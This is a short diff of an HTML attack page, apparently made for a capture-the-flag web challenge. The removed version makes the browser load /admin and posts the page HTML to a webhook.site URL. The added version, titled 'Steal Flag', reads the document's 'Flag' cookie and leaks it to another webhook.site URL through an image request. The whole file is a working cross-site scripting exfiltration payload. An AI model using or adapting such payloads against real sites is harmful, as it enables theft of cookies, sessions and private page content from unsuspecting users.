@@ -1,10 +1,18 @@
-<h1 hx-get="/admin" hx-trigger="load" hx-target="body" hx-swap="outerHTML"></h1>
-<h2>Test</h2>
-<script>
-  setTimeout(() => {
-    fetch('https://webhook.site/3589cfeb-7f3a-4829-b4e6-7836dc7c5d90', {
-      method: 'POST',
-      body: document.body.innerHTML
-    });
-  }, 5000);
-</script>
+<!DOCTYPE html>
+<html>
+<head>
+  <title>Steal Flag</title>
+  <script>
+    // JavaScript to steal the cookie
+    var flagCookie = document.cookie.split('; ').find(row => row.startsWith('Flag='));
+    if (flagCookie) {
+      var flagValue = flagCookie.split('=')[1];
+      var img = new Image();
+      img.src = `https://webhook.site/91949cf1-8886-45e6-acf0-3f10004fd35f/steal?flag=${flagValue}`;
+    }
+  </script>
+</head>
+<body>
+  <h1>Stealing Flag...</h1>
+</body>
+</html>
